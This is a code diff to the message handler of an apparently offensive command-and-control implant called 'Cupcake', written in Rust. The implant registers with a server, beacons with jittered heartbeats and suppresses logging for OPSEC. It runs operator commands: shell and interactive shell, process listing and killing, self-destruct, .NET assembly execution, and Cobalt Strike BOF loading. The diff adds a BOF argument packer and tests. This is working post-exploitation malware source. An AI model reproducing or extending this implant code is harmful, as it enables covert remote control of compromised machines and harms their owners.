@@ -2,7 +2,7 @@
 //
 // 负责处理传输层消息的接收、解析和响应。
 // 实现完整的消息循环：注册 → 监听命令 → 执行 → 响应。
-// 
+//
 // 协议无关设计：通过 Transport trait 与传输层交互，
 // 不依赖任何具体的传输协议实现。
 
@@ -11,17 +11,84 @@ use crate::error::{ClientError, Result};
 use crate::executor::CommandExecutor;
 use crate::transport::Transport;
 use crate::types::{CommandPayload, CommandResult, MessageType, MessageWrapper, SystemInfo};
-use log::{debug, error, info, warn};
-use futures_util::future::{BoxFuture, FutureExt};
 use base64::Engine;
+use futures_util::future::{BoxFuture, FutureExt};
+use log::{debug, error, info, warn};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+/// Normalize BOF argument buffer for Cobalt Strike `BeaconDataParse` consumers.
+///
+/// Server/UI often send plain UTF-8 (or base64 of plain text). CS BOFs expect a
+/// packed buffer: first field is typically a BE length-prefixed string/blob.
+///
+/// Heuristic: if buffer already looks like CS datap (first 4 bytes BE length fits
+/// remaining), leave unchanged; else wrap as one BE-length-prefixed blob
+/// (`len` includes trailing NUL when input is printable text).
+fn normalize_bof_args(raw: &[u8]) -> Vec<u8> {
+    if raw.is_empty() {
+        return Vec::new();
+    }
+    if raw.len() >= 4 {
+        let n = i32::from_be_bytes([raw[0], raw[1], raw[2], raw[3]]);
+        if n >= 0 {
+            let n = n as usize;
+            // Fits remainder and is a plausible single field (or multi-field start)
+            if n <= raw.len().saturating_sub(4) && (n > 0 || raw.len() == 4) {
+                // Already packed (at least first field is length-prefixed)
+                return raw.to_vec();
+            }
+        }
+    }
+    // Pack as single length-prefixed buffer. For printable text, include trailing NUL
+    // so BeaconDataExtract/BeaconDataParse string helpers work.
+    let printable = raw
+        .iter()
+        .all(|&c| c == b'\t' || c == b'\n' || c == b'\r' || (c >= 0x20 && c < 0x7f));
+    let mut body = raw.to_vec();
+    if printable && !body.ends_with(&[0]) {
+        body.push(0);
+    }
+    let mut out = Vec::with_capacity(4 + body.len());
+    out.extend_from_slice(&(body.len() as i32).to_be_bytes());
+    out.extend_from_slice(&body);
+    out
+}
+
+#[cfg(test)]
+mod bof_args_tests {
+    use super::normalize_bof_args;
+
+    #[test]
+    fn packs_plain_text_with_nul() {
+        let packed = normalize_bof_args(b"whoami");
+        assert_eq!(&packed[0..4], &7i32.to_be_bytes()); // "whoami\0"
+        assert_eq!(&packed[4..], b"whoami\0");
+    }
+
+    #[test]
+    fn leaves_already_packed() {
+        let mut raw = Vec::new();
+        raw.extend_from_slice(&3i32.to_be_bytes());
+        raw.extend_from_slice(b"ab\0");
+        let out = normalize_bof_args(&raw);
+        assert_eq!(out, raw);
+    }
+
+    #[test]
+    fn empty_stays_empty() {
+        assert!(normalize_bof_args(b"").is_empty());
+    }
+}
 
 /// Stage0: command needs L2 module not yet loaded.
 #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
 fn stage0_module_required(command_type: &str) -> CommandResult {
     let msg = match crate::module_loader::ensure_module_for_command(command_type) {
         Err(e) => e,
-        Ok(()) => format!("module_required:{} (loaded but no handler path)", command_type),
+        Ok(()) => format!(
+            "module_required:{} (loaded but no handler path)",
+            command_type
+        ),
     };
     CommandResult {
         stdout: String::new(),
@@ -114,15 +181,15 @@ fn stage0_module_unload(payload: &crate::types::CommandPayload) -> CommandResult
 }
 
 /// 消息处理器
-/// 
+///
 /// 负责处理与服务端的所有消息交互，包括：
 /// - 发送注册消息
 /// - 接收和解析命令消息
 /// - 执行命令
 /// - 发送响应消息
-/// 
+///
 /// # 设计原则
-/// 
+///
 /// - 协议无关：只依赖 Transport trait，不关心底层是 WebSocket、DNS 还是其他协议
 /// - 错误恢复：单个消息处理失败不会导致连接断开
 /// - 资源管理：拥有 Transport 的所有权，可以在需要时返还给调用者
@@ -133,23 +200,28 @@ pub struct MessageHandler {
 
 impl MessageHandler {
     /// 创建新的消息处理器
-    /// 
+    ///
     /// # 参数
-    /// 
+    ///
     /// * `transport` - 实现了 Transport trait 的传输层
     pub fn new(transport: Box<dyn Transport>) -> Self {
         Self { transport }
     }
-    
+
+    /// Recover transport after a one-shot dispatch (used by BatchMessageHandler).
+    pub fn into_transport(self) -> Box<dyn Transport> {
+        self.transport
+    }
+
     /// 运行消息处理循环
-    /// 
+    ///
     /// 该方法会：
     /// 1. 发送注册消息
     /// 2. 进入无限循环接收和处理消息
     /// 3. 如果连接断开或发生错误，返回 transport 以便外层重连
-    /// 
+    ///
     /// # 返回值
-    /// 
+    ///
     /// - `Ok(transport)`: 正常退出，返回 transport 供重连使用
     /// - `Err(e)`: 发生错误，transport 已失效
     pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
@@ -164,7 +236,11 @@ impl MessageHandler {
 
         // 🛡️ Phase 3: Adaptive Heartbeat with Gaussian Jitter
         let base_interval = crate::config::get_heartbeat_interval();
-        let base_interval_secs = if base_interval == 0 { 30 } else { base_interval };
+        let base_interval_secs = if base_interval == 0 {
+            30
+        } else {
+            base_interval
+        };
 
         // Adaptive multiplier: doubles when idle, halves when active
         let mut idle_multiplier: u64 = 1;
@@ -189,8 +265,8 @@ impl MessageHandler {
                 mean as f64
             };
 
-            // Clamp to reasonable range (at least 10 seconds, max 2 hours)
-            let final_delay = gaussian.max(10.0).min(7200.0) as u64;
+            // Clamp: min 10s; max 300s so we stay under typical server idle (≤600s)
+            let final_delay = gaussian.max(10.0).min(300.0) as u64;
 
             crate::utils::db_print(&format!(
                 "[Cupcake] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
@@ -267,41 +343,40 @@ impl MessageHandler {
     }
 
     /// 发送注册消息
-    /// 
+    ///
     /// 收集系统信息并发送注册消息到服务端。
     async fn register(&mut self) -> Result<()> {
         crate::utils::db_print("[Cupcake] register() started...");
         // 收集系统信息
         let sys_info = SystemInfo::collect();
         crate::utils::db_print("[agent] SystemInfo collected.");
-        
+
         // 初始化传输层（某些协议如 DNS 需要 UUID）
         self.transport.initialize(&sys_info.uuid);
-        
+
         // 构造注册消息
         let register_msg = sys_info.to_register_message();
         crate::utils::db_print("[agent] Sending Register message...");
-        
+
         // 发送注册消息
         self.send_message(&register_msg).await?;
         crate::utils::db_print("[agent] Register message sent.");
-        
+
         Ok(())
     }
-    
+
     /// 处理接收到的消息
-    /// 
+    ///
     /// 解析 JSON 消息并根据消息类型进行相应的处理。
     async fn handle_message(&mut self, data: &[u8]) -> Result<()> {
         // 将字节数据转换为字符串
-        let text = String::from_utf8(data.to_vec())
-            .map_err(|e| ClientError::ConnectionError(
-                format!("Invalid UTF-8 in received message: {}", e)
-            ))?;
-        
+        let text = String::from_utf8(data.to_vec()).map_err(|e| {
+            ClientError::ConnectionError(format!("Invalid UTF-8 in received message: {}", e))
+        })?;
+
         // ⚡ OPSEC: 不要在控制台打印收到的完整协议内容
         // trace!("Received message: {}", text);
-        
+
         // 反序列化消息
         let wrapper: MessageWrapper = match serde_json::from_str(&text) {
             Ok(w) => w,
@@ -310,7 +385,7 @@ impl MessageHandler {
                 return Err(ClientError::SerializationError(e));
             }
         };
-        
+
         // 根据消息类型处理
         match wrapper.msg_type {
             MessageType::Command => {
@@ -323,12 +398,12 @@ impl MessageHandler {
                 warn!("Received unexpected Response message from server");
             }
         }
-        
+
         Ok(())
     }
-    
+
     /// 处理命令消息
-    /// 
+    ///
     /// 解析命令、执行命令、发送响应。
     /// 支持的命令类型：
     /// - shell: 执行 shell 命令
@@ -664,8 +739,8 @@ impl MessageHandler {
             "self_destruct" => {
                 crate::utils::self_destruct().await
             }
-            // .NET: product path = isolated iso_host CLR (minimal/standard both have isolated-exec).
-            // In-process CLR only when isolated-exec is off (legacy thin builds).
+            // .NET: product path = isolated iso_host CLR (minimal has isolated-exec).
+            // In-process CLR only when isolated-exec is off (legacy custom builds).
             #[cfg(feature = "isolated-exec")]
             "execute_assembly" => {
                 let assembly = command_payload
@@ -828,8 +903,8 @@ impl MessageHandler {
                     },
                 }
             }
-            // BOF: product path = isolated iso_host (minimal has isolated-exec, not feature=bof).
-            // In-process Module Overloading only when isolated-exec is disabled.
+            // BOF: product path = isolated iso_host (minimal: isolated-exec, not feature=bof).
+            // In-process Module Overloading only when isolated-exec is disabled (legacy).
             #[cfg(feature = "isolated-exec")]
             "bof_exec" => {
                 let content = command_payload.command_content.trim();
@@ -872,6 +947,8 @@ impl MessageHandler {
                                     .unwrap_or_else(|_| content.as_bytes().to_vec())
                             }
                         };
+                        // If operator sent plain text (not CS datap), pack as one length-prefixed blob
+                        let arg_bytes = normalize_bof_args(&arg_bytes);
                         let mut r =
                             crate::isolated_exec::run_bof_isolated(&bytes, &arg_bytes).await;
                         r.req_id = command_payload.req_id.clone();
@@ -925,6 +1002,7 @@ impl MessageHandler {
                                 .unwrap_or_default();
                             (bytes, args)
                         };
+                        let arg_bytes = normalize_bof_args(&arg_bytes);
 
                         #[cfg(all(feature = "bof", target_os = "windows"))]
                         match crate::loader::bof::BofLoader::execute(&final_bytes, &arg_bytes).await
@@ -963,12 +1041,15 @@ impl MessageHandler {
                 }
             }
 
-            _ => {
-                warn!(
-                    "Unsupported command type: {}, ignoring",
-                    command_payload.command_type
-                );
-                return Ok(());
+            other => {
+                warn!("Unsupported command type: {}", other);
+                // Always reply so UI / PendingResponses does not hang
+                CommandResult {
+                    stdout: String::new(),
+                    stderr: format!("unsupported command type: {other}"),
+                    path: None,
+                    req_id: None,
+                }
             }
         };
         
@@ -984,7 +1065,7 @@ impl MessageHandler {
         Ok(())
         }.boxed()
     }
-    
+
     /// 列出系统进程 (Windows: NtQuerySystemInformation / Linux: /proc)
     #[cfg(feature = "post-ex")]
     async fn process_list() -> CommandResult {
@@ -1023,9 +1104,14 @@ impl MessageHandler {
                     let path = entry.path();
                     if let Some(pid_str) = path.file_name().and_then(|s| s.to_str()) {
                         if pid_str.chars().all(|c| c.is_digit(10)) {
-                            let name = std::fs::read_to_string(path.join("comm")).unwrap_or_default().trim().to_string();
-                            let status = std::fs::read_to_string(path.join("status")).unwrap_or_default();
-                            let ppid = status.lines()
+                            let name = std::fs::read_to_string(path.join("comm"))
+                                .unwrap_or_default()
+                                .trim()
+                                .to_string();
+                            let status =
+                                std::fs::read_to_string(path.join("status")).unwrap_or_default();
+                            let ppid = status
+                                .lines()
                                 .find(|l| l.starts_with("PPid:"))
                                 .and_then(|l| l.split_whitespace().nth(1))
                                 .and_then(|s| s.parse::<u32>().ok())
@@ -1046,8 +1132,18 @@ impl MessageHandler {
         }
 
         match serde_json::to_string(&processes) {
-            Ok(json) => CommandResult { stdout: json, stderr: String::new(), path: None, req_id: None },
-            Err(e) => CommandResult { stdout: "[]".to_string(), stderr: e.to_string(), path: None, req_id: None },
+            Ok(json) => CommandResult {
+                stdout: json,
+                stderr: String::new(),
+                path: None,
+                req_id: None,
+            },
+            Err(e) => CommandResult {
+                stdout: "[]".to_string(),
+                stderr: e.to_string(),
+                path: None,
+                req_id: None,
+            },
         }
     }
 
@@ -1056,7 +1152,14 @@ impl MessageHandler {
     async fn process_kill(pid_str: &str) -> CommandResult {
         let pid_u32 = match pid_str.parse::<u32>() {
             Ok(p) => p,
-            Err(_) => return CommandResult { stdout: String::new(), stderr: "Invalid PID".to_string(), path: None, req_id: None },
+            Err(_) => {
+                return CommandResult {
+                    stdout: String::new(),
+                    stderr: "Invalid PID".to_string(),
+                    path: None,
+                    req_id: None,
+                }
+            }
         };
 
         #[cfg(target_os = "windows")]
@@ -1095,20 +1198,20 @@ impl MessageHandler {
             }
         }
     }
-    
+
     /// 发送消息到服务端
-    /// 
+    ///
     /// 将消息序列化为 JSON 并通过传输层发送。
     async fn send_message(&mut self, msg: &MessageWrapper) -> Result<()> {
         // 序列化消息
         let json = serde_json::to_string(msg)?;
-        
+
         // ⚡ OPSEC: 移除发送内容的明文打印
-        // trace!("Sending message: {}", json); 
-        
+        // trace!("Sending message: {}", json);
+
         // 通过传输层发送
         self.transport.send(json.as_bytes()).await?;
-        
+
         Ok(())
     }
 
@@ -1127,13 +1230,16 @@ impl MessageHandler {
             String::from_utf8_lossy(bytes).into_owned()
         }
     }
-    
+
     /// 启动交互式 shell 会话（仅 post-ex / legacy monolith）。
     ///
     /// Stage0 (`beacon`) 不得编译此路径：禁止在 L1 内直接 spawn cmd.exe / bash。
     /// Stage0 交互作业通过 `mod_shell` 的 one-shot `shell` 命令完成。
     #[cfg(feature = "post-ex")]
-    fn start_interactive_shell<'a>(&'a mut self, req_id: Option<String>) -> BoxFuture<'a, CommandResult> {
+    fn start_interactive_shell<'a>(
+        &'a mut self,
+        req_id: Option<String>,
+    ) -> BoxFuture<'a, CommandResult> {
         async move {
         info!("Starting interactive shell session");
         
@@ -1373,7 +1479,9 @@ fn chrono_like_now() -> i32 {
     ((std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_secs() % 86400 / 3600)
-        .unwrap_or(12) as i32) + 8) % 24
+        .unwrap_or(12) as i32)
+        + 8)
+        % 24
 }
 
 #[cfg(test)]
